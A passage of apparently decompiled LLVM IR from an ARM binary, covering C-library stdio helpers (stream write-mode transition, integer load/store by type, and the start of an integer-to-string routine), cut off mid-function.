  br label %dec_label_pc_173d4

dec_label_pc_173c0:                               ; preds = %dec_label_pc_173ac.dec_label_pc_173c0_crit_edge, %entry, %dec_label_pc_173a0
  %v2_173cc = phi i32 [ %v2_173cc.pre, %dec_label_pc_173ac.dec_label_pc_173c0_crit_edge ], [ %v3_172a4, %entry ], [ %v3_172a4, %dec_label_pc_173a0 ]
  %v0_173c4 = phi i32 [ %v0_173c4.pre, %dec_label_pc_173ac.dec_label_pc_173c0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_173a0 ]
  %v0_173c0 = phi i32 [ %v0_173c0.pre, %dec_label_pc_173ac.dec_label_pc_173c0_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_173a0 ]
  %v0_173c8 = phi i32 [ %v0_173c8.pre, %dec_label_pc_173ac.dec_label_pc_173c0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_173a0 ]
  store i32 %v2_173cc, i32* @r4, align 4
  store i32 %v9_172a4, i32* @r6, align 4
  store i32 %v15_172a4, i32* @lr, align 4
  %v3_173d0 = inttoptr i32 %v0_173c0 to i8*
  %v4_173d0 = call i32 @__stdio_WRITE(i8* %v3_173d0, i32 %v0_173c4, i32 %v0_173c8)
  br label %dec_label_pc_173d4

dec_label_pc_173d4:                               ; preds = %bb13, %dec_label_pc_17358, %dec_label_pc_17348, %dec_label_pc_17330, %dec_label_pc_1730c, %dec_label_pc_17384, %bb10, %dec_label_pc_173c0
  %v0_173d4 = load i32, i32* @r6, align 4
  %v2_173d8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_173d8, i32* @r4, align 4
  store i32 %v6_172a4, i32* @r5, align 4
  store i32 %v9_172a4, i32* @r6, align 4
  store i32 %v12_172a4, i32* @r7, align 4
  ret i32 %v0_173d4

; uselistorder directives
  uselistorder i32 %v2_1738c, { 1, 0 }
  uselistorder i32 %v2_17364, { 1, 0 }
  uselistorder i32 %v0_1734c.v0_17358, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17358, { 1, 0, 2 }
  uselistorder i32 %v2_172d8, { 2, 0, 1, 3 }
  uselistorder i32 %v9_172a4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 7, 5, 4, 8, 3, 6 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_173d4, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_173c0, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_173dc = load i32, i32* @r4, align 4
  store i32 %v3_173dc, i32* %stack_var_-8, align 4
  %v3_173e0 = load i8, i8* %arg1, align 1
  %v4_173e0 = zext i8 %v3_173e0 to i32
  store i32 %v4_173e0, i32* %r2.global-to-local, align 4
  %v2_173e4 = add i32 %tmp, 1
  %v3_173e4 = inttoptr i32 %v2_173e4 to i8*
  %v4_173e4 = load i8, i8* %v3_173e4, align 1
  %v5_173e4 = zext i8 %v4_173e4 to i32
  store i32 %v5_173e4, i32* %r3.global-to-local, align 4
  %v4_173e8 = mul nuw nsw i32 %v5_173e4, 256
  %v5_173e8 = or i32 %v4_173e8, %v4_173e0
  store i32 %v5_173e8, i32* %r2.global-to-local, align 4
  %v2_173ec = and i32 %v5_173e8, %arg2
  %v4_173ec = icmp eq i32 %v2_173ec, 0
  store i1 %v4_173ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_173ec, label %dec_label_pc_173f8, label %dec_label_pc_17410

dec_label_pc_173f8:                               ; preds = %entry
  %v1_173f8 = and i32 %v5_173e8, 2176
  %v2_173f8 = icmp eq i32 %v1_173f8, 0
  store i1 %v2_173f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_173f8, label %dec_label_pc_17400, label %dec_label_pc_17424

dec_label_pc_17400:                               ; preds = %dec_label_pc_173f8
  %v2_17400 = or i32 %v5_173e8, %arg2
  store i32 %v2_17400, i32* %r2.global-to-local, align 4
  %v3_17404 = sdiv i32 %v2_17400, 256
  store i32 %v3_17404, i32* %r3.global-to-local, align 4
  %v1_17408 = trunc i32 %v3_17404 to i8
  store i8 %v1_17408, i8* %v3_173e4, align 1
  %v0_1740c = load i32, i32* %r2.global-to-local, align 4
  %v1_1740c = trunc i32 %v0_1740c to i8
  store i8 %v1_1740c, i8* %arg1, align 1
  %v0_17410.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17410

dec_label_pc_17410:                               ; preds = %entry, %dec_label_pc_17400
  %v0_1745c = phi i32 [ %tmp, %entry ], [ %v0_17410.pre, %dec_label_pc_17400 ]
  %v1_17410 = inttoptr i32 %v0_1745c to i8*
  %v2_17410 = load i8, i8* %v1_17410, align 1
  %v3_17410 = zext i8 %v2_17410 to i32
  store i32 %v3_17410, i32* %r2.global-to-local, align 4
  %v1_17414 = add i32 %v0_1745c, 1
  %v2_17414 = inttoptr i32 %v1_17414 to i8*
  %v3_17414 = load i8, i8* %v2_17414, align 1
  %v4_17414 = zext i8 %v3_17414 to i32
  store i32 %v4_17414, i32* %r3.global-to-local, align 4
  %v4_17418 = mul nuw nsw i32 %v4_17414, 256
  %v1_1741c = and i32 %v3_17410, 32
  %v2_1741c = icmp eq i32 %v1_1741c, 0
  store i1 %v2_1741c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1741c, label %dec_label_pc_1744c, label %dec_label_pc_17424

dec_label_pc_17424:                               ; preds = %dec_label_pc_173f8, %dec_label_pc_17410
  %v0_17424 = call i32 @__errno_location()
  store i32 %v0_17424, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1742c = inttoptr i32 %v0_17424 to i32*
  store i32 9, i32* %v2_1742c, align 4
  br label %dec_label_pc_17430

dec_label_pc_17430:                               ; preds = %dec_label_pc_17474, %dec_label_pc_17424
  %v0_17430 = load i32, i32* @r4, align 4
  %v1_17430 = inttoptr i32 %v0_17430 to i32*
  %v2_17430 = load i32, i32* %v1_17430, align 4
  %v1_17434 = or i32 %v2_17430, 8
  store i32 %v1_17434, i32* %r3.global-to-local, align 4
  %v3_17438 = sdiv i32 %v2_17430, 256
  store i32 %v3_17438, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_17440 = trunc i32 %v3_17438 to i8
  %v3_17440 = add i32 %v0_17430, 1
  %v4_17440 = inttoptr i32 %v3_17440 to i8*
  store i8 %v1_17440, i8* %v4_17440, align 1
  %v0_17444 = load i32, i32* %r3.global-to-local, align 4
  %v1_17444 = trunc i32 %v0_17444 to i8
  %v2_17444 = load i32, i32* @r4, align 4
  %v3_17444 = inttoptr i32 %v2_17444 to i8*
  store i8 %v1_17444, i8* %v3_17444, align 1
  %v2_17448 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17448, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1744c:                               ; preds = %dec_label_pc_17410
  %tmp15 = urem i8 %v2_17410, 4
  %v2_1744c = icmp eq i8 %tmp15, 0
  store i1 %v2_1744c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1744c, label %dec_label_pc_174b0, label %dec_label_pc_17454

dec_label_pc_17454:                               ; preds = %dec_label_pc_1744c
  %v1_17454 = and i32 %v3_17410, 4
  store i32 %v1_17454, i32* @r1, align 4
  %v2_17454 = icmp eq i32 %v1_17454, 0
  store i1 %v2_17454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17454, label %dec_label_pc_1745c, label %dec_label_pc_1748c

dec_label_pc_1745c:                               ; preds = %dec_label_pc_17454
  %v1_1745c = add i32 %v0_1745c, 20
  %v2_1745c = inttoptr i32 %v1_1745c to i32*
  %v3_1745c = load i32, i32* %v2_1745c, align 4
  store i32 %v3_1745c, i32* %r2.global-to-local, align 4
  %v1_17460 = add i32 %v0_1745c, 16
  %v2_17460 = inttoptr i32 %v1_17460 to i32*
  %v3_17460 = load i32, i32* %v2_17460, align 4
  store i32 %v3_17460, i32* %r3.global-to-local, align 4
  %v9_17464 = icmp eq i32 %v3_1745c, %v3_17460
  store i1 %v9_17464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17464, label %dec_label_pc_1746c, label %dec_label_pc_17474

dec_label_pc_1746c:                               ; preds = %dec_label_pc_1745c
  %v1_1746c = and i32 %v3_17410, 2
  %v2_1746c = icmp eq i32 %v1_1746c, 0
  store i1 %v2_1746c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1746c, label %dec_label_pc_1748c, label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %dec_label_pc_1745c, %dec_label_pc_1746c
  %v1_17474 = and i32 %v4_17418, 1024
  %v2_17474 = icmp eq i32 %v1_17474, 0
  store i1 %v2_17474, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_17474, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_17480 = call i32 @__GI_fseek()
  store i32 %v0_17480, i32* %r0.global-to-local, align 4
  %v2_17484 = icmp eq i32 %v0_17480, 0
  store i1 %v2_17484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17484, label %.dec_label_pc_1748c_crit_edge, label %dec_label_pc_17430

.dec_label_pc_1748c_crit_edge:                    ; preds = %dec_label_pc_17474
  %v0_1748c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1748c

dec_label_pc_1748c:                               ; preds = %.dec_label_pc_1748c_crit_edge, %dec_label_pc_17454, %dec_label_pc_1746c
  %v2_1749c = phi i32 [ %v0_1748c.pre, %.dec_label_pc_1748c_crit_edge ], [ %v0_1745c, %dec_label_pc_17454 ], [ %v0_1745c, %dec_label_pc_1746c ]
  %v1_1748c = inttoptr i32 %v2_1749c to i32*
  %v2_1748c = load i32, i32* %v1_1748c, align 4
  store i32 %v2_1748c, i32* %r3.global-to-local, align 4
  %v1_17490 = add i32 %v2_1749c, 8
  %v2_17490 = inttoptr i32 %v1_17490 to i32*
  %v3_17490 = load i32, i32* %v2_17490, align 4
  store i32 %v3_17490, i32* %r1.global-to-local, align 4
  %v1_17494 = and i32 %v2_1748c, -4
  store i32 %v1_17494, i32* %r3.global-to-local, align 4
  %v3_17498 = sdiv i32 %v2_1748c, 256
  store i32 %v3_17498, i32* %r2.global-to-local, align 4
  %v1_1749c = trunc i32 %v3_17498 to i8
  %v3_1749c = add i32 %v2_1749c, 1
  %v4_1749c = inttoptr i32 %v3_1749c to i8*
  store i8 %v1_1749c, i8* %v4_1749c, align 1
  %v0_174a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_174a0 = load i32, i32* @r4, align 4
  %v2_174a0 = add i32 %v1_174a0, 20
  %v3_174a0 = inttoptr i32 %v2_174a0 to i32*
  store i32 %v0_174a0, i32* %v3_174a0, align 4
  %v0_174a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_174a4 = trunc i32 %v0_174a4 to i8
  %v2_174a4 = load i32, i32* @r4, align 4
  %v3_174a4 = inttoptr i32 %v2_174a4 to i8*
  store i8 %v1_174a4, i8* %v3_174a4, align 1
  %v0_174a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_174a8 = load i32, i32* @r4, align 4
  %v2_174a8 = add i32 %v1_174a8, 24
  %v3_174a8 = inttoptr i32 %v2_174a8 to i32*
  store i32 %v0_174a8, i32* %v3_174a8, align 4
  %v0_174ac = load i32, i32* %r1.global-to-local, align 4
  %v1_174ac = load i32, i32* @r4, align 4
  %v2_174ac = add i32 %v1_174ac, 16
  %v3_174ac = inttoptr i32 %v2_174ac to i32*
  store i32 %v0_174ac, i32* %v3_174ac, align 4
  %v0_174b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_174b0

dec_label_pc_174b0:                               ; preds = %dec_label_pc_1744c, %dec_label_pc_1748c
  %v2_174bc = phi i32 [ %v0_1745c, %dec_label_pc_1744c ], [ %v0_174b0.pre, %dec_label_pc_1748c ]
  %v1_174b0 = inttoptr i32 %v2_174bc to i32*
  %v2_174b0 = load i32, i32* %v1_174b0, align 4
  %v1_174b4 = or i32 %v2_174b0, 64
  store i32 %v1_174b4, i32* %r2.global-to-local, align 4
  %v3_174b8 = sdiv i32 %v2_174b0, 256
  store i32 %v3_174b8, i32* %r3.global-to-local, align 4
  %v1_174bc = trunc i32 %v3_174b8 to i8
  %v3_174bc = add i32 %v2_174bc, 1
  %v4_174bc = inttoptr i32 %v3_174bc to i8*
  store i8 %v1_174bc, i8* %v4_174bc, align 1
  %v0_174c0 = load i32, i32* @r4, align 4
  %v1_174c0 = add i32 %v0_174c0, 1
  %v2_174c0 = inttoptr i32 %v1_174c0 to i8*
  %v3_174c0 = load i8, i8* %v2_174c0, align 1
  %v4_174c0 = zext i8 %v3_174c0 to i32
  %v3_174c4 = mul nuw nsw i32 %v4_174c0, 256
  store i32 %v3_174c4, i32* %r3.global-to-local, align 4
  %v1_174c8 = and i32 %v3_174c4, 2816
  store i32 %v1_174c8, i32* %r0.global-to-local, align 4
  %v2_174c8 = icmp eq i32 %v1_174c8, 0
  store i1 %v2_174c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_174c8, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_174b0
  %v2_174cc = add i32 %v0_174c0, 12
  %v3_174cc = inttoptr i32 %v2_174cc to i32*
  %v4_174cc = load i32, i32* %v3_174cc, align 4
  store i32 %v4_174cc, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_174b0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_174d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_174d4 = trunc i32 %v0_174d4 to i8
  %v3_174d4 = inttoptr i32 %v0_174c0 to i8*
  store i8 %v1_174d4, i8* %v3_174d4, align 1
  %v0_174d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_174d8, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_174d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_174d8 = load i32, i32* @r4, align 4
  %v3_174d8 = add i32 %v2_174d8, 28
  %v4_174d8 = inttoptr i32 %v3_174d8 to i32*
  store i32 %v1_174d8, i32* %v4_174d8, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_174dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_174dc, i32* @r4, align 4
  %v8_174dc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_174dc

; uselistorder directives
  uselistorder i32 %v3_174c4, { 1, 0 }
  uselistorder i32 %v3_174b8, { 1, 0 }
  uselistorder i32 %v3_17498, { 1, 0 }
  uselistorder i32 %v2_1749c, { 0, 2, 1 }
  uselistorder i1 %v2_1744c, { 1, 0 }
  uselistorder i32 %v3_17438, { 1, 0 }
  uselistorder i32 %v0_1745c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_17404, { 1, 0 }
  uselistorder i32 %v5_173e8, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 7, 8, 2, 9, 1, 10, 11, 12, 4, 5, 6, 3 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_174b0, { 1, 0 }
  uselistorder label %dec_label_pc_1748c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17474, { 1, 0 }
  uselistorder label %dec_label_pc_17424, { 1, 0 }
  uselistorder label %dec_label_pc_17410, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_174e0 = load i32, i32* @r2, align 4
  %v1_174e0 = icmp slt i32 %v0_174e0, 0
  %v0_174e4 = load i32, i32* @r0, align 4
  %v1_174e8 = and i32 %v0_174e4, 2048
  %v2_1751c = icmp eq i32 %v1_174e8, 0
  br i1 %v1_174e0, label %dec_label_pc_1751c, label %dec_label_pc_174f0

dec_label_pc_174f0:                               ; preds = %entry
  br i1 %v2_1751c, label %dec_label_pc_174f8, label %dec_label_pc_17524

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174f0
  %v7_174f8 = icmp eq i32 %v0_174e4, 256
  %v0_174fc = load i32, i32* @r1, align 4
  %v1_174fc = inttoptr i32 %v0_174fc to i32*
  %v2_174fc = load i32, i32* %v1_174fc, align 4
  %v2_17500 = urem i32 %v2_174fc, 256
  %v2_17500.v2_174fc = select i1 %v7_174f8, i32 %v2_17500, i32 %v2_174fc
  br i1 %v7_174f8, label %.thread, label %dec_label_pc_17508

dec_label_pc_17508:                               ; preds = %dec_label_pc_174f8
  %v7_17508 = icmp eq i32 %v0_174e4, 512
  br i1 %v7_17508, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17508
  %v4_17510 = urem i32 %v2_17500.v2_174fc, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17508, %dec_label_pc_174f8, %bb
  %v1_17518 = phi i32 [ %v2_174fc, %dec_label_pc_17508 ], [ %v2_17500, %dec_label_pc_174f8 ], [ %v4_17510, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_17518

dec_label_pc_1751c:                               ; preds = %entry
  br i1 %v2_1751c, label %dec_label_pc_1752c, label %dec_label_pc_17524

dec_label_pc_17524:                               ; preds = %dec_label_pc_174f0, %dec_label_pc_1751c
  %v0_17524 = load i32, i32* @r1, align 4
  %v1_17524 = inttoptr i32 %v0_17524 to i32*
  %v2_17524 = load i32, i32* %v1_17524, align 4
  %v3_17524 = add i32 %v0_17524, 4
  %v4_17524 = inttoptr i32 %v3_17524 to i32*
  %v5_17524 = load i32, i32* %v4_17524, align 4
  store i32 %v5_17524, i32* @r1, align 4
  ret i32 %v2_17524

dec_label_pc_1752c:                               ; preds = %dec_label_pc_1751c
  %v7_1752c = icmp eq i32 %v0_174e4, 256
  %v0_17530 = load i32, i32* @r1, align 4
  %v1_17530 = inttoptr i32 %v0_17530 to i32*
  %v2_17530 = load i32, i32* %v1_17530, align 4
  %v2_17534 = urem i32 %v2_17530, 256
  %v2_17534.v2_17530 = select i1 %v7_1752c, i32 %v2_17534, i32 %v2_17530
  br i1 %v7_1752c, label %.thread2, label %dec_label_pc_1753c

dec_label_pc_1753c:                               ; preds = %dec_label_pc_1752c
  %v7_1753c = icmp eq i32 %v0_174e4, 512
  br i1 %v7_1753c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1753c
  %v4_17540 = mul i32 %v2_17534.v2_17530, 65536
  %v4_17544 = sdiv i32 %v4_17540, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1753c, %dec_label_pc_1752c, %bb5
  %v0_17548 = phi i32 [ %v2_17530, %dec_label_pc_1753c ], [ %v2_17534, %dec_label_pc_1752c ], [ %v4_17544, %bb5 ]
  %v3_17548 = ashr i32 %v0_17548, 31
  store i32 %v3_17548, i32* @r1, align 4
  ret i32 %v0_17548

; uselistorder directives
  uselistorder i32 %v0_17548, { 1, 0 }
  uselistorder i32 %v2_17534, { 1, 0 }
  uselistorder i32 %v2_17530, { 1, 2, 0 }
  uselistorder i32 %v2_17500, { 1, 0 }
  uselistorder i32 %v2_174fc, { 1, 2, 0 }
  uselistorder i1 %v2_1751c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17524, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_17550 = icmp eq i32 %arg2, 256
  br i1 %v7_17550, label %dec_label_pc_1757c, label %dec_label_pc_17558

dec_label_pc_17558:                               ; preds = %entry
  %v7_17558 = icmp eq i32 %arg2, 2048
  br i1 %v7_17558, label %dec_label_pc_17560, label %dec_label_pc_17568

dec_label_pc_17560:                               ; preds = %dec_label_pc_17558
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_17560 = add i32 %tmp2, 4
  %v6_17560 = inttoptr i32 %v5_17560 to i32*
  store i32 %arg4, i32* %v6_17560, align 4
  ret i32 %tmp2

dec_label_pc_17568:                               ; preds = %dec_label_pc_17558
  %v7_17568 = icmp eq i32 %arg2, 512
  br i1 %v7_17568, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_17568
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_17568
  %v4_1756c = sdiv i32 %arg3, 256
  %v1_17578 = trunc i32 %v4_1756c to i8
  %v4_17578 = add i32 %tmp2, 1
  %v5_17578 = inttoptr i32 %v4_17578 to i8*
  store i8 %v1_17578, i8* %v5_17578, align 1
  br label %dec_label_pc_1757c

dec_label_pc_1757c:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1757c, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_17588 = icmp slt i32 %arg4, 0
  %v2_17588 = icmp eq i32 %arg4, 0
  store i1 %v2_17588, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_17588, label %dec_label_pc_175a0, label %dec_label_pc_175c0

dec_label_pc_175a0:                               ; preds = %entry
  %v1_175a0 = icmp slt i32 %arg3, 0
  %v2_175a0 = icmp eq i32 %arg3, 0
  store i1 %v2_175a0, i1* %cpsr_z.global-to-local, align 1
  %v1_175a4 = sub i32 0, %arg4
  store i32 %v1_175a4, i32* %r7.global-to-local, align 4
  br i1 %v1_175a0, label %dec_label_pc_175ac, label %dec_label_pc_175c0

dec_label_pc_175ac:                               ; preds = %dec_label_pc_175a0
  %v1_175b0 = sub i32 0, %arg2
  store i32 %v1_175b0, i32* %r5.global-to-local, align 4
  %v2_175b0 = icmp eq i32 %arg2, 0
  %v2_175b4 = icmp eq i1 %v2_175b0, false
  %v5_175b4 = sext i1 %v2_175b4 to i32
  %v6_175b4 = sub i32 %v5_175b4, %arg3
  store i32 %v6_175b4, i32* %r6.global-to-local, align 4
  %v19_175b4 = icmp eq i32 %v6_175b4, 0
  store i1 %v19_175b4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_175c8

dec_label_pc_175c0:                               ; preds = %dec_label_pc_175a0, %entry
  br label %dec_label_pc_175c8

dec_label_pc_175c8:                               ; preds = %dec_label_pc_175ac, %dec_label_pc_175c0
  %storemerge = phi i8 [ 0, %dec_label_pc_175c0 ], [ 1, %dec_label_pc_175ac ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_175d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_175d8 = udiv i32 -1, %v0_175d0
  store i32 %v2_175d8, i32* %fp.global-to-local, align 4
  %v2_175e8 = urem i32 -1, %v0_175d0
  %v1_175ec = add i32 %v2_175e8, 1
  store i32 %v1_175ec, i32* %sb.global-to-local, align 4
  %v9_175f0 = icmp eq i32 %v1_175ec, %v0_175d0
  store i1 %v9_175f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_175f0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_175c8
  %v1_175f4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_175f4, i32* %sb.global-to-local, align 4
  %v2_175f8 = add i32 %v2_175d8, 1
  store i32 %v2_175f8, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_175c8, %bb
  %v0_175fc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_175fc, i32* %sl.global-to-local, align 4
  %v0_17600 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17600, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17604

dec_label_pc_17604thread-pre-split:               ; preds = %bb21
  %v0_17604.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_1760c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_17604thread-pre-split, %.thread
  %v0_17674 = phi i32 [ %v0_1760c.pre, %dec_label_pc_17604thread-pre-split ], [ %v0_175d0, %.thread ]
  %v0_17620 = phi i32 [ %v0_17604.pr, %dec_label_pc_17604thread-pre-split ], [ %v0_175fc, %.thread ]
  %v2_17604 = icmp eq i32 %v0_17620, 0
  store i1 %v2_17604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17604, label %dec_label_pc_17670, label %dec_label_pc_17614

dec_label_pc_17614:                               ; preds = %dec_label_pc_17604
  %v2_17614 = urem i32 %v0_17620, %v0_17674
  %v2_17624 = udiv i32 %v0_17620, %v0_17674
  store i32 %v2_17624, i32* %sl.global-to-local, align 4
  %v0_17630 = load i32, i32* %r6.global-to-local, align 4
  %v2_17634 = urem i32 %v0_17630, %v0_17674
  %v1_1763c = load i32, i32* %sb.global-to-local, align 4
  %v3_1763c = mul i32 %v1_1763c, %v2_17614
  %v4_1763c = add i32 %v3_1763c, %v2_17634
  store i32 %v4_1763c, i32* %r5.global-to-local, align 4
  %v2_17644 = udiv i32 %v0_17630, %v0_17674
  %v0_1764c = load i32, i32* %fp.global-to-local, align 4
  %v3_1764c = mul i32 %v0_1764c, %v2_17614
  %v4_1764c = add i32 %v3_1764c, %v2_17644
  %v2_17654 = udiv i32 %v4_1763c, %v0_17674
  %v2_1765c = add i32 %v4_1764c, %v2_17654
  br label %dec_label_pc_17690

dec_label_pc_17670:                               ; preds = %dec_label_pc_17604
  %v0_17670 = load i32, i32* %r6.global-to-local, align 4
  %v2_17688 = udiv i32 %v0_17670, %v0_17674
  br label %dec_label_pc_17690

dec_label_pc_17690:                               ; preds = %dec_label_pc_17614, %dec_label_pc_17670
  %storemerge24 = phi i32 [ %v2_17688, %dec_label_pc_17670 ], [ %v2_1765c, %dec_label_pc_17614 ]
  %v0_176ac = phi i32 [ %v2_17688, %dec_label_pc_17670 ], [ %v2_1765c, %dec_label_pc_17614 ]
  %v1_176ac = phi i32 [ 0, %dec_label_pc_17670 ], [ %v2_17624, %dec_label_pc_17614 ]
  %v4_1763c.pn = phi i32 [ %v0_17670, %dec_label_pc_17670 ], [ %v4_1763c, %dec_label_pc_17614 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_17698 = urem i32 %v4_1763c.pn, %v0_17674
  %v3_17690 = load i32, i32* %stack_var_0, align 4
  %v2_17694 = icmp ugt i32 %v0_17698, 8
  %v7_17694 = icmp eq i32 %v0_17698, 9
  store i1 %v7_17694, i1* %cpsr_z.global-to-local, align 1
  %v1_1769c = add i32 %v0_17698, 48
  %v0_176a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_176a4 = add i32 %v0_176a4, -1
  store i32 %v1_176a4, i32* %r8.global-to-local, align 4
  %v2_176a8 = xor i1 %v7_17694, true
  %v3_176a8 = and i1 %v2_17694, %v2_176a8
  %extract.t = trunc i32 %v1_1769c to i8
  br i1 %v3_176a8, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17690
  %v2_17698 = add i32 %v3_17690, %v0_17698
  %extract.t8 = trunc i32 %v2_17698 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_17690, %bb20
  %v0_176b0.off0 = phi i8 [ %extract.t, %dec_label_pc_17690 ], [ %extract.t8, %bb20 ]
  %v2_176ac = or i32 %v0_176ac, %v1_176ac
